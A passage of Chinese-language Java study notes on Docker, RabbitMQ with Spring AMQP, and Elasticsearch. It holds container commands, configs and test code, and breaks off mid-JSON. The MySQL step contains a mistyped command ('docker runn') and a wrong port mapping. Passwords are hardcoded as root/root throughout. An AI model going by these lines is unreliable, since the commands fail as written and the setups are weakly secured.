--name=mycentos7 centos:7 /bin/bash # 创建一个守护式容器【创建守护容器并不会马上进入到容器里面】 # 创建并启动守护式容器 # 容器名称: mycentos2 # 镜像名称:TAG (centos:7) 也可以使用镜像id (5e35e350aded) docker run -id --name=mycentos2 centos:7 # 进入容器： # docker exec -it container_name (或者 container_id) /bin/bash # exit退出时，容器不会停止 docker exec -it mycentos2 /bin/bash # 停止正在运行的容器: docker stop 容器名称|容器ID docker stop mycentos2 # 启动已运行过的容器: docker start 容器名称|容器ID docker start mycentos2 # 重启正在运行的容器: docker restart 容器名称|容器ID docker restart mycentos2 查看容器信息【docker容器内部的IP是有可能发生变化的】 # 在linux宿主机下查看 mycentos2 的ip # docker inspect 容器名称（容器ID） docker inspect mycentos2 删除容器【删除一个容器的前提是停止容器运行】 # 删除指定的容器: docker rm 容器名称|容器ID docker rm mycentos2 # 或者 docker rm 2095a22bee70 # 删除所有容器 docker rm `docker ps -a -q` 容器文件拷贝 # 将宿主机中的文件拷贝到容器内 # docker cp 需要拷贝的文件或目录 容器名称:容器目录 # 复制 abc.txt 到 mycentos2 的容器的 / 目录下 docker cp abc.txt mycentos2:/ # 将文件从容器内拷贝出来到宿主机 # docker cp 容器名称:文件路径 宿主机目标路径 # 在Linux宿主机器执行复制；将容器mycentos2的/aaa.txt文件复制到 宿主机器的/root目录下 docker cp mycentos2:/aaa.txt /root 容器目录挂载（目录映射） # 在创建容器时，将宿主机的目录与容器内的目录进行映射 # 创建并启动容器mycentos3 # 并挂载 linux中的/usr/local/test目录到容器的/usr/local/test # 也就是在 linux中的/usr/local/test中操作相当于对容器相应目录操作 docker run -id -v /usr/local/test:/usr/local/test --name=mycentos3 centos:7 创建常用应用容器 安装MySQL -p 代表端口映射，格式为 宿主机映射端口:容器运行端口 -e 代表添加环境变量 MYSQL_ROOT_PASSWORD 是root用户的远程登陆密码（如果是在容器中使用root登录的话,那么其密码为空） # 拉取MySQL 5.7镜像 docker pull centos/mysql-57-centos7 #把本地的mysql的服务停止，否则你没法使用3306端口去做映射(看你本地是否有安装mysql，如果没有安装可以省略该步骤) systemctl stop mysqld systemctl disable mysqld # 创建mysql5.7容器 docker runn -id --name=mysql5.7 -p 3306:33306 -e MYSQL_ROOT_PASSWORD=root centos/mysql-57-centos7 # 进入mysql5.7容器 docker exec -it mysql5.7 /bin/bash mysql -u root -p 安装Tomcat 创建容器 # 拉取tomcat镜像 docker pull tomcat:8.5.71-jdk11-temurin-focal # 创建tomcat容器;并挂载了webapps目录，端口映射 docker run -id --name=mytomcat -p 8080:8080 -v /usr/local/tomcat/webapps:/usr/local/tomcat/webapps tomcat:8.5.71-jdk11-temurin-focal 部署web应用 #数据源配置 spring: datasource: driver-class-name: com.mysql.jdbc.Driver #使用宿主机IP（已端口映射） url: jdbc:mysql://192.168.65.182:3306/springdb?useSSL=false username: root password: root mybatis: #别名扫描 type-aliases-package: cn.itcast.model configuration: #开启下划线与小驼峰映射 map-underscore-to-camel-case: true #开启mybatis执行sql语句的日志 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #定义mapper文件所在的位置 mapper-locations: - classpath:mappers/*.xml - 修改springboot工程的pom文件 war org.springframework.boot spring-boot-starter-tomcat provided ROOT org.springframework.boot spring-boot-maven-plugin /** * 编写WebServletInitializer类（Tomcat无法识别启动类，需要编写此类） */ import cn.itcast.HighApplication; import org.springframework.boot.builder.SpringApplicationBuilder; import org.springframework.boot.web.servlet.support.SpringBootServletInitializer; /** * 作用等价于web.xml */ public class WebServletInitializer extends SpringBootServletInitializer { @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) { // 【注意】修改启动类 builder.sources(Application.class); return builder; } } 进入项目pom文件命令行下，执行打包命令: mvn package -Dmaven.test.skip=true 上传ROOT.war到/usr/local/tomcat/webapps/目录下 安装Nginx 创建容器 # 拉取nginx镜像 docker pull nginx # 创建nginx容器和端口映射 docker run -id --name=mynginx -p 80:80 nginx 配置nginx.conf反向代理设置 server { listen 80; server_name 127.0.0.1; location / { proxy_pass http://宿主机ip地址:8080; } } 重启nginx容器 docker restart mynginx 安装Redis 创建容器 # 拉取redis镜像 docker pull redis # 创建redis容器和端口映射 docker run -di --name=myredis -p 6379:6379 redis 容器备份与迁移 主要作用：就是让配置好的容器，可以得到复用，后面用到得的时候就不需要重新配置 相关命令 容器保存镜像: docker commit 容器名称 新的镜像的名称 导出镜像: docker save -o 镜像名称.tar 新的镜像的名称 导入镜像: docker load -i 镜像名称.tar registry私服仓库 Docker官方的Docker hub（https://hub.docker.com）是一个用于管理公共镜像的仓库，我们可以从上面拉取镜像到本地，也可以把我们自己的镜像推送上去。但是，有时候我们的服务器无法访问互联网，或者你不希望将自己的镜像放到公网当中，那么我们就需要搭建自己的私有仓库来存储和管理自己的镜像。 搭建私服 # 1、拉取私有仓库镜像 docker pull registry # 2、启动私有仓库容器 docker run -di --name=registry -p 5000:5000 registry # 3、打开浏览器 输入地址http://宿主机ip:5000/v2/_catalog，看到{\"repositories\":[]} 表示私有仓库 搭建成功。 将镜像上传至私服 # 假设现在是另一台服务器，修改daemon.json vim /etc/docker/daemon.json # 在上述文件中添加一个key，保存退出。此步用于让 docker 信任私有仓库地址 { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"], \"insecure-registries\":[\"私服地址:5000\"] } # 标记镜像为私有仓库的镜像 # 语法: docker tag 镜像名称 私服IP:5000/镜像名称 docker tag jdk1.8 192.168.12.132:5000/jdk1.8 # 上传标记的镜像到私有仓库 # 语法: docker push 宿主机IP:5000/镜像名称 docker push 192.168.12.132:5000/jdk1.8 # 3、输入网址查看仓库效果 从私服拉取镜像 # 拉取镜像 # 语法: docker pull 服务器ip:5000/jdk1.8 docker pull 192.168.12.132:5000/jdk1.8 #可以通过如下命令查看 docker 的信息；了解到私有仓库地址 docker info Dockerfile构建镜像（了解） 那如果我们想自己开发一个镜像，那该如何做呢？答案是: Dockerfile Dockerfile其实就是一个文本文件，由一系列命令和参数构成，Docker可以读取Dockerfile文件并根据Dockerfile文件的描述来构建镜像。 Dockerfile文件内容一般分为4部分 基础镜像信息（镜像 = 软件 + 软件运行环境） 维护者信息（作者） 镜像操作指令 容器启动时执行的指令 常用命令 命令 作用 FROM image_name:tag 定义了使用哪个基础镜像启动构建流程 MAINTAINER user_name 声明镜像的创建者 ENV key value 设置环境变量 (可以写多条) RUN command 是Dockerfile的核心部分(可以写多条) ADD source_dir/file dest_dir/file 将宿主机的文件复制到镜像创建的容器内，如果是一个压缩文件，将会在复制后自动解压 COPY source_dir/file dest_dir/file 和ADD相似，但是如果有压缩文件并不能解压 WORKDIR path_dir 设置工作目录（别人一进去到你容器所在路径） 构建镜像 # 1、创建目录 mkdir /usr/local/dockerjdk8 cd /usr/local/dockerjdk8 # 2、下载jdk-8u171-linux-x64.tar.gz并上传到服务器（虚拟机）中的/usr/local/dockerjdk8目录 # 3、在/usr/local/dockerjdk8目录下创建Dockerfile文件，文件内容如下: vim Dockerfile FROM centos:7 MAINTAINER ztl WORKDIR /usr RUN mkdir /usr/local/java ADD jdk-8u171-linux-x64.tar.gz /usr/local/java/ ENV JAVA_HOME /usr/local/java/jdk1.8.0_171 ENV PATH $JAVA_HOME/bin:$PATH # 4、执行命令构建镜像；不要忘了后面的那个 . （点代表当前目录） # -t 指定镜像名称 docker build -t='jdk1.8' . # 5、查看镜像是否建立完成 docker images 根据镜像创建容器 # 创建并启动容器 docker run -it --name=testjdk jdk1.8 /bin/bash # 在容器中测试jdk是否已经安装 java -version Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-31 21:57 "},"Java笔记/Day56-RabbitMQ.html":{"url":"Java笔记/Day56-RabbitMQ.html","title":"Day56-RabbitMQ","keywords":"","body":"RabbitMQ MQ，中文是消息队列（MessageQueue），字面来看就是存放消息的队列。也就是事件驱动架构中的Broker。 比较常见的MQ实现：RabbitMQ、RocketMQ、Kafka 同步和异步通讯 同步通讯： 优点： 时效性强，可以立即得到结果 缺点： 耦合度高：每次加入新的需求都要修改原来的代码 性能下降：调用者需要等待服务提供者响应，等于所有调用服务的响应时间之和 资源浪费：调用链中的每个服务在等待响应的过程中，不能释放请求占用的资源 级联失败：如果服务提供者出现问题，所有调用方都会出现问题，导致整个微服务群故障 异步通讯： 优点： 吞吐量提升：无需等待订阅者处理完成，响应更快 故障隔离：服务没有直接调用，不存在级联问题 调用间没有阻塞，不会造成无效的资源占用 耦合度极低：每个服务都可以灵活插拔 流量削峰：不管发布事件的流量波动多大，都由Broker接收，订阅者可以按照自己的速度处理事件 缺点： 架构复杂的情况下，业务没有明显的流程线，不好管理 依赖于Broker的可靠性 RabbitMQ部署 # 拉取镜像 docker pull rabbitmq:3-management # 部署 docker run \\ -e RABBITMQ_DEFAULT_USER=root \\ -e RABBITMQ_DEFAULT_PASS=root \\ -v mq-plugins:/plugins \\ --name mq \\ --hostname mq \\ -p 15672:15672 \\ -p 5672:5672 \\ -d \\ rabbitmq:3-management RabbitMQ消息模型 官方地址：https://www.rabbitmq.com/getstarted.html publisher：消息发布者，将消息发送到队列queue queue：消息队列，负责接受并缓存消息 consumer：订阅队列，处理队列中的消息 消息模型： 简单模型 工作队列模型：Workqueues 发布订阅模型：Publish 路由模型：Routing 主题模型：Topics RPC Publisher Confirms 原生RabbitMQ实现（了解） package cn.itcast.mq.helloworld; import com.rabbitmq.client.*; import java.io.IOException; import java.util.concurrent.TimeoutException; public class ConsumerTest { public static void main(String[] args) throws IOException, TimeoutException { // 1.建立连接 ConnectionFactory factory = new ConnectionFactory(); // 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码 factory.setHost(\"192.168.65.182\"); factory.setPort(5672); factory.setVirtualHost(\"/\"); factory.setUsername(\"root\"); factory.setPassword(\"root\"); // 1.2.建立连接 Connection connection = factory.newConnection(); // 2.创建通道Channel Channel channel = connection.createChannel(); // 3.创建队列 String queueName = \"simple.queue\"; channel.queueDeclare(queueName, false, false, false, null); // 4.订阅消息 channel.basicConsume(queueName, true, new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { // 5.处理消息 String message = new String(body); System.out.println(\"接收到消息：【\" + message + \"】\"); } }); System.out.println(\"等待接收消息。。。。\"); } } package cn.itcast.mq.helloworld; import com.rabbitmq.client.Channel; import com.rabbitmq.client.Connection; import com.rabbitmq.client.ConnectionFactory; import org.junit.Test; import java.io.IOException; import java.util.concurrent.TimeoutException; public class PublisherTest { @Test public void testSendMessage() throws IOException, TimeoutException { // 1.建立连接 ConnectionFactory factory = new ConnectionFactory(); // 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码 factory.setHost(\"192.168.65.182\"); factory.setPort(5672); factory.setVirtualHost(\"/\"); factory.setUsername(\"root\"); factory.setPassword(\"root\"); // 1.2.建立连接 Connection connection = factory.newConnection(); // 2.创建通道Channel Channel channel = connection.createChannel(); // 3.创建队列 String queueName = \"simple.queue\"; channel.queueDeclare(queueName, false, false, false, null); // 4.发送消息 String message = \"hello, rabbitmq!\"; channel.basicPublish(\"\", queueName, null, message.getBytes()); System.out.println(\"发送消息成功：【\" + message + \"】\"); // 5.关闭通道和连接 channel.close(); connection.close(); } } SpringAMQP SpringAMQP是基于RabbitMQ封装的一套模板，并且还利用SpringBoot对其实现了自动装配。 相关配置 在父模块中导入依赖 org.springframework.boot spring-boot-starter-amqp 在发布者和订阅者的application.yml中添加配置 logging: pattern: dateformat: MM-dd HH:mm:ss:SSS spring: rabbitmq: host: 192.168.65.182 port: 5672 username: root password: root virtual-host: / 消息转换器 Spring发送消息时，默认采用JDK序列化将信息发送给MQ，接收消息的时候，还会把字节反序列化为Java对象。 存在 数据体积过大、有安全漏洞、可读性差 的问题。 解决方式-配置JSON转换器 在父模块中导入依赖 com.fasterxml.jackson.dataformat jackson-dataformat-xml 2.9.10 com.fasterxml.jackson.core jackson-databind 2.9.10.5 在发布者和订阅者的启动类中都添加以下Bean //配置消息转换器 @Bean public MessageConverter jsonMessageConverter(){ return new Jackson2JsonMessageConverter(); } 简单模型 消息队列 @Configuration @Slf4j public class RabbitConfig { //=========简单模型========= //声明一个队列，名字为simple.queue @Bean public Queue simpleQueue() { return new Queue(\"simple.queue\"); } 监听器 package cn.itcast.mq.listener; import lombok.extern.slf4j.Slf4j; import org.springframework.amqp.rabbit.annotation.RabbitListener; import org.springframework.stereotype.Component; @Component @Slf4j public class SimpleQueueListener { /** * 这个方法是一个回调方法，只要队列列队里面有消息，就会调用该方法 * 并且把队列的消息的内容传递给方法的形参message */ //=========简单模型========= @RabbitListener(queues = \"simple.queue\") public void listener(String message) { log.info(\"simple.listener消费消息：\" + message); } } 消息发布 package cn.itcast.mq; import org.junit.jupiter.api.Test; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class SimpleQueueSend { //使用springAMQP一定要创建核心类 @Autowired private RabbitTemplate rabbitTemplate; @Test public void sendMessage(){ String message = \"简单模型生产的消息\"; String queueName = \"simple.queue\"; rabbitTemplate.convertAndSend(queueName,message); } } 队列模型 多个消费者绑定到一个队列，同一条消息只会被一个消费者处理 消息队列 //=========队列模型========= @Bean public Queue workQueue() { return new Queue(\"work.queue\"); } 监听器 package cn.itcast.mq.listener; import lombok.extern.slf4j.Slf4j; import org.springframework.amqp.rabbit.annotation.RabbitListener; import org.springframework.stereotype.Component; @Component @Slf4j public class WorkQueueListener { //=========队列模型========= @RabbitListener(queues = \"work.queue\") public void listener1(String message) throws InterruptedException { log.info(\"work.listener1消费的消息：\" + message); Thread.sleep(500); } @RabbitListener(queues = \"work.queue\") public void listener2(String message){ log.info(\"work.listener2消费的消息：\" + message); } } 消息发布 package cn.itcast.mq; import org.junit.jupiter.api.Test; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class WorkQueueSend { //使用springAMQP一定要创建核心类 @Autowired private RabbitTemplate rabbitTemplate; @Test public void sendMessage() { String message = \"队列模型生产的消息\"; String queueName = \"work.queue\"; for (int i = 1; i 能者多劳 # 默认是轮询消费消息队列 spring: rabbitmq: listener: simple: prefetch: 1 # 每次只能获取一条消息，处理完成才能获取下一个消息 发布订阅模型 Exchange（交换机）：只负责转发消息，不具备存储消息的能力。 交换机类型： Fanout：广播，将消息交给所有绑定到交换机的队列 Direct：定向，把消息交给符合指定routing key 的队列 Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列 消息队列 //=========发布订阅模型========= //定义一个广播交换机 @Bean public FanoutExchange fanoutExchange() { return new FanoutExchange(\"fanout.exchange\"); } //定义两个队列 @Bean public Queue fanoutQueue1() { return new Queue(\"fanout.queue1\"); } @Bean public Queue fanoutQueue2() { return new Queue(\"fanout.queue2\"); } //把队列绑定到交换机上 @Bean public Binding bindingQueue1(FanoutExchange fanoutExchange, Queue fanoutQueue1) { return BindingBuilder.bind(fanoutQueue1).to(fanoutExchange); } @Bean public Binding bindingQueue2(FanoutExchange fanoutExchange, Queue fanoutQueue2) { return BindingBuilder.bind(fanoutQueue2).to(fanoutExchange); } 监听器 package cn.itcast.mq.listener; import lombok.extern.slf4j.Slf4j; import org.springframework.amqp.rabbit.annotation.RabbitListener; import org.springframework.stereotype.Component; @Component @Slf4j public class FanoutQueueListener { //=========发布订阅模型========= @RabbitListener(queues = \"fanout.queue1\") public void listener1(String message){ log.info(\"fanout.listener1消费的消息：\" + message); } @RabbitListener(queues = \"fanout.queue2\") public void listener2(String message){ log.info(\"fanout.listener2消费的消息：\" + message); } } 消息发布 package cn.itcast.mq; import org.junit.jupiter.api.Test; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class FanoutQueueSend { //使用springAMQP一定要创建核心类 @Autowired private RabbitTemplate rabbitTemplate; @Test public void sendMessage() { String message = \"发布订阅模型生产的消息\"; String exchangeName = \"fanout.exchange\"; //参数一：交换机 参数二：路由key , 参数三：消息 rabbitTemplate.convertAndSend(exchangeName, \"\", message); } } 路由模型 Direct：定向，把消息交给符合指定routing key 的队列 消息队列 //=========路由模型========= //方式一：@Bean实现 //定义一个路由交换机 /*@Bean public DirectExchange directExchange(){ return new DirectExchange(\"direct.exchange\"); } //定义两个队列 @Bean public Queue directQueue1(){ return new Queue(\"direct.queue1\"); } @Bean public Queue directQueue2(){ return new Queue(\"direct.queue2\"); } //把队列绑定到交换机上 @Bean public Binding bindingQueue3(DirectExchange directExchange, Queue directQueue1){ return BindingBuilder.bind(directQueue1).to(directExchange).with(\"user\"); } @Bean public Binding bindingQueue4(DirectExchange directExchange, Queue directQueue2){ return BindingBuilder.bind(directQueue2).to(directExchange).with(\"order\"); }*/ //方式二：@RabbitListener注解实现 /** * QueueBinding注解的作用： * 1. 在运行的时候如果发现rabbitmq里面没有对应的交换机、队列，就会马上创建交换机与队列 * 2. 如果Rabbitmq中一旦存在对应交换机与队列，那么就只有监听队列的作用。 */ @RabbitListener(bindings = { @QueueBinding( //定义交换机 exchange = @Exchange(name = \"direct.exchange\", type = ExchangeTypes.DIRECT), //定义队列 value = @org.springframework.amqp.rabbit.annotation.Queue(\"direct.queue1\"), //路由key key = \"user\" ) }) public void directListener1(String message) { log.info(\"direct.listener1消费的消息：\" + message); } @RabbitListener(bindings = { @QueueBinding( //定义交换机 exchange = @Exchange(name = \"direct.exchange\", type = ExchangeTypes.DIRECT), //定义队列 value = @org.springframework.amqp.rabbit.annotation.Queue(\"direct.queue2\"), //路由key key = \"order\" ) }) public void directListener2(String message) { log.info(\"direct.listener2消费的消息：\" + message); } 监听器 package cn.itcast.mq.listener; import lombok.extern.slf4j.Slf4j; import org.springframework.amqp.rabbit.annotation.RabbitListener; import org.springframework.stereotype.Component; @Component @Slf4j public class DirectQueueListener { //=========路由模型========= //方式一：@Bean实现的情况下才需要单独写listener //方式二：@RabbitListener注解实现不需要单独写 /* @RabbitListener(queues = \"direct.queue1\") public void listener1(String message){ log.info(\"direct.listener1消费的消息：\" + message); } @RabbitListener(queues = \"direct.queue2\") public void listener2(String message){ log.info(\"direct.listener2消费的消息：\" + message); }*/ } 消息发布 package cn.itcast.mq; import org.junit.jupiter.api.Test; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class DirectQueueSend { //使用springAMQP一定要创建核心类 @Autowired private RabbitTemplate rabbitTemplate; @Test public void sendMessage() { String message = \"路由模型生产的user消息\"; String exchangeName = \"direct.exchange\"; String routingKey = \"user\"; //参数一：交换机 参数二：路由key , 参数三：消息 rabbitTemplate.convertAndSend(exchangeName, routingKey, message); } } 主题模型 Routingkey 一般都是有一个或多个单词组成，多个单词之间以”.”分割，例如： item.insert 通配符规则： #：匹配一个或多个词 *：匹配不多不少恰好1个词 举例： item.#：能够匹配item.spu.insert 或者 item.spu item.*：只能匹配item.spu 消息队列 //=========主题模型========= @RabbitListener(bindings = { @QueueBinding( //定义交换机 exchange = @Exchange(name = \"topic.exchange\", type = ExchangeTypes.TOPIC), //定义队列 value = @org.springframework.amqp.rabbit.annotation.Queue(\"topic.queue1\"), //路由key key = \"work.#\" ) }) public void topicListener1(String message) { log.info(\"topic.listener1消费的消息：\" + message); } @RabbitListener(bindings = { @QueueBinding( //定义交换机 exchange = @Exchange(name = \"topic.exchange\",type = ExchangeTypes.TOPIC), //定义队列 value = @org.springframework.amqp.rabbit.annotation.Queue(\"topic.queue2\"), key = \"work.*\" ) }) public void topicListener2(String message){ log.info(\"topic.listener2消费的消息：\" + message); } } 消息发布 package cn.itcast.mq; import org.junit.jupiter.api.Test; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class TopicQueueSend { //使用springAMQP一定要创建核心类 @Autowired private RabbitTemplate rabbitTemplate; @Test public void sendMessage() { String message = \"主题模型生产的消息\"; String exchangeName = \"topic.exchange\"; String routingKey = \"work.SZ.top100\"; //参数一：交换机 参数二：路由key , 参数三：消息 rabbitTemplate.convertAndSend(exchangeName, routingKey, message); } } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-31 21:25 "},"Java笔记/Day57~59-ElasticSearch.html":{"url":"Java笔记/Day57~59-ElasticSearch.html","title":"Day57~59-ElasticSearch","keywords":"","body":"ElasticSearch ElasticSeach概念 关系型数据库提供的查询功能太弱。比如：使用模糊查询，左边有通配符，不会走索引，会全表扫描，性能低 ElasticSearch是Java语言开发的，并作为Apache许可条款下的开放源码发布，基于Lucene实现，是一款分布式、高扩展、近实时的搜索服务，可以基于RESTful web接口进行操作。官网：https://www.elastic.co/ Elasticsearch是面向文档(Document)的分布式搜索引擎 Kibana是一个与Elasticsearch协同工作的开源分析和可视化平台 基于Lucene的产品： Slor：实时性偏弱，在高并发地写入数据时，Slor需要频繁地构建索引库，而索引库构建影响到查询性能 Elasticsearch：实时性非常强（近实时），ES在频繁地构建索引库的同时，不太影响查询的性能 倒排索引 首先对所有数据内容进行首先对所有数据的内容进行拆分（分词），拆分成唯一的一个个词语（词条Term） 然后建立词条和每条数据的对应关系（词条在文档出现的位置、频率） 应用场景 海量数据的查询 日志数据分析 实时数据分析 ElasticSearch与MySQL对比 基本概念 | MySQL | Elasticsearch | 说明 | | ------ | ------------- | ------------------------------------------------------------ | | Table | Index | 索引(index)，就是文档的集合，类似数据库的表(table) | | Row | Document | 文档（Document），就是一条条的数据，类似数据库中的行（Row），文档都是JSON格式 | | Cloumn | Feild | 字段（Field），就是JSON文档中的字段，类似数据库中的列（Column） | | Schema | Mapping | Mapping（映射）是索引中文档的约束，例如字段类型约束。类似数据库的表结构（Schema） | | SQL | DSL | 语句 | Mysql：擅长事务类型操作，可以确保数据的安全和一致性，进行复杂的多表查询 Elasticsearch：擅长海量数据的搜索、分析、计算 安装ElasticSearch Docker创建ElasticSearch docker run -id --name elasticsearch -d -p 9200:9200 -v /usr/share/elasticsearch/plugins:/usr/share/elasticsearch/plugins -e \"discovery.type=single-node\" elasticsearch:7.4.0 Docker创建Kibana docker run -d -p 5601:5601 --link elasticsearch --name=kibana -e \"ELASTICSEARCH_URL=http://宿主机地址:9200\" kibana:7.4.0 DSL操作ES 客户端使用GET、POST、PUT、DELETE 4个表示操作方式的动词对服务端资源进行操作： GET：用来获取资源 POST：用来新建资源（也可以用于更新资源） PUT：用来新建资源（修改） DELETE：用来删除资源 操作索引库 #=============操作索引库============== # 添加索引库 PUT test # 查询索引库 GET test # 删除索引库 DELETE test # 关闭索引库(当索引进入关闭状态，是不能添加文档的) POST test/_close # 打开索引库 POST test/_open 操作映射 #=============操作映射============== # 创建索引库并添加映射 PUT person { \"mappings\": { \"properties\": { \"name\":{ \"type\": \"text\" }, \"age\":{ \"type\": \"integer\" } } } } # 查询映射 GET person/_mapping # 注意：ES不能单独修改映射字段名称或类型，不能单独删除某个字段，如果需要修改，直接删除整个索引库再重建 # 添加映射 PUT person/_mapping { \"properties\":{ \"sex\":{ \"type\":\"keyword\" } } } ES的数据类型 简单数据类型 字符串： text：可以分词，不支持聚合（统计） keyword：不会分词，将全部内容作为一个词条，支持聚合（统计） 数值：long、integer、short、byte、double、float、half_float、scaled_float 布尔boolean 二进制binary 范围类型：integer_range, float_range, long_range, double_range, date_range 日期date 复杂数据类型 数组 []：没有专用的array数据类型，任何一个字段的值，都可以被添加0个到多个，但要求他们的类型必须一致，当类型一直含有多个值存储到ES中会自动转化成数组类型 对象 {} GEO：geo_point经纬度 操作文档 #=============操作文档============== # 添加文档，指定id POST person/_doc/1 { \"name\":\"张三\", \"age\":18, \"sex\":\"男\" } # 添加文档，不指定id POST person/_doc { \"name\":\"李四\", \"age\":19, \"sex\":\"女\" } # 查询文档，id为1 GET person/_doc/1 # 查询全部，不指定id GET person/_search # 修改文档（覆盖） POST person/_doc/1 { \"name\":\"张三\", \"age\":23, \"sex\":\"男\" } # 查询张三 GET person/_search { \"query\": { \"term\": { \"name\": { \"value\": \"张三\" } } } } # 根据id删除文档 DELETE person/_doc/1 分词器 分词器（Analyzer）是将一段文本，按照一定逻辑，拆分成多个词语的一种工具 Standard Analyzer - 默认分词器，按词/字切分，小写处理 Simple Analyzer - 按照非字母切分(符号被过滤)，小写处理 Stop Analyzer - 小写处理，停用词过滤(the,a,is) Whitespace Analyzer - 按照空格切分，不转小写 Keyword Analyzer - 不分词，直接将输入当作输出 Patter Analyzer - 正则表达式，默认\\W+(非字符分割) （中文会被去掉） Language - 提供了30多种常见语言的分词器 #=============分词器============== # 分词效果 GET _analyze { \"text\":\"默认分词器\" , \"analyzer\": \"standard\" } # ik分词器，最细粒度分词 GET _analyze { \"text\": \"下个武器池我要抽到护摩之杖\", \"analyzer\": \"ik_max_word\" } # 使用分词器创建索引库 PUT person { \"mappings\": { \"properties\": { \"name\":{ \"type\": \"text\", \"analyzer\": \"ik_smart\" }, \"age\":{ \"type\": \"integer\" }, \"sex\":{ \"type\": \"keyword\" } } } } IK分词器 IKAnalyzer是一个开源的，基于java语言开发的轻量级的中文分词工具包，并且支持用户词典扩展定义。下载地址：https://github.com/medcl/elasticsearch-analysis-ik/releases 分词算法： ik_smart：最小分词法 ik_max_word：最细分词法 安装IK分词器 将解压后的文件夹放入/usr/share/elasticsearch/plugins 重启ES 扩展&停止词典 ==注意：当前文件的编码必须是UTF-8 with BOM格式，严禁使用Windows记事本编辑== 修改analysis-ik/config/IKAnalyzer.cfg.xml配置 IK Analyzer 扩展配置 ext.dic stop.dic words_location --> words_location --> 在ext.dic文件中添加扩展词典，在stop.dic文件中添加停止词典 重启ES HighLevelAPI-SpringBoot ES官方提供了各种不同语言的客户端，用来操作ES。这些客户端的本质就是组装DSL语句，通过http请求发送给ES。官方文档地址：https://www.elastic.co/guide/en/elasticsearch/client/index.html 其中的Java Rest Client又包括两种： Java Low Level Rest Client Java High Level Rest Client 整合HighLevelAPI 导入依赖 org.elasticsearch.client elasticsearch-rest-high-level-client 配置application.yml spring: elasticsearch: rest: uris: - http://192.168.65.182:9200 编写测试类 @SpringBootTest @Slf4j public class IndexTest { @Autowired(required = false) private HotelMapper hotelMapper; // 操作es索引库的核心类 @Autowired private RestHighLevelClient highLevelClient; //测试java代码是否与es索引库建立链接 @Test public void testConnection(){ System.out.println(\"链接对象：\"+ highLevelClient); } } 创建&删除索引 /** * 创建索引库 */ @Test public void CreatIndex() throws IOException { //凡是对索引库的增删改都需要创建indicesClient对象 //1.创建indicesClient操作索引库的客户端对象 IndicesClient indicesClient = highLevelClient.indices(); //2.创建一个创建索引库的请求 CreateIndexRequest createIndexRequest = new CreateIndexRequest(\"hotel\"); //3.使用索引库的客户端对象发出创建请求 CreateIndexResponse response = indicesClient.create(createIndexRequest, RequestOptions.DEFAULT); log.info(\"创建成功吗？\" + response.isAcknowledged()); } /** * 删除索引库 */ @Test public void deleteIndex() throws IOException { //1.获取索引库的客户端对象 IndicesClient indicesClient = highLevelClient.indices(); //2.创建删除请求 DeleteIndexRequest deleteIndexRequest = new DeleteIndexRequest(\"hotel\"); //3.发出请求 AcknowledgedResponse response = indicesClient.delete(deleteIndexRequest, RequestOptions.DEFAULT); log.info(\"删除成功了吗？\" + response.isAcknowledged()); } 创建索引并添加映射 // index属性：是否建立索引，默认值true，如果该字段不用查询，则设置false // copy_to: 把指定字段的值拷贝到另一个字段上，后续查询即可选择此字段进行查询 /** * 创建索引并添加映射 */ @Test public void creatIndexWithMapping() throws IOException { //1.创建操作索引库的客户端对象 IndicesClient indicesClient = highLevelClient.indices(); //2.创建一个创建索引库的请求 CreateIndexRequest createIndexRequest = new CreateIndexRequest(\"hotel\"); String json = \"{\\n\" + \" \\\"properties\\\": {\\n\" + \" \\\"id\\\":{\\n\" + \" \\\"type\\\": \\\"keyword\\\"\\n\" + \" },\\n\" + \" \\\"name\\\":{\\n\" + \" \\\"type\\\": \\\"text\\\",\\n\" + \" \\\"analyzer\\\": \\\"ik_smart\\\",\\n\" + \" \\\"copy_to\\\": \\\"all\\\"\\n\" + \" },\\n\" + \" \\\"address\\\":{\\n\" + \" \\\"type\\\": \\\"text\\\",\\n\" + \" \\\"analyzer\\\": \\\"ik_smart\\\"\\n\" + \" },\\n\" + \" \\\"price\\\":{\\n\" + \" \\\"type\\\": \\\"double\\\"\\n\" + \" },\\n\" + \" \\\"score\\\":{\\n\" + \" \\\"type\\\": \\\"double\\\"\\n\" + \" },\\n\" + \" \\\"brand\\\":{\\n\" + \" \\\"type\\\": \\\"keyword\\\",\\n\" + \" \\\"copy_to\\\": \\\"all\\\"\\n\" + \" },\\n\" + \" \\\"city\\\":{\\n\" + \" \\\"type\\\": \\\"keyword\\\"\\n\" + \" },\\n\" + \" \\\"starName\\\":{\\n\" + \" \\\"type\\\": \\\"keyword\\\"\\n\" + \" },\\n\" + \" \\\"business\\\":{\\n\" + \" \\\"type\\\": \\\"keyword\\\",\\n\" + \" \\\"copy_to\\\": \\\"all\\\"\\n\" + \" },\\n\" + \" \\\"location\\\":{\\n\" + \" \\\"type\\\": \\\"geo_point\\\"\\n\" + \" },\\n\" + \" \\\"pic\\\":{\\n\" + \" \\\"type\\\": \\\"keyword\\\",\\n\" + \" \\\"index\\\": false\\n\" + \" },\\n\" + \" \\\"isAD\\\":{\\n\" + \" \\\"type\\\": \\\"boolean\\\"\\n\" + \" },\\n\" + \" 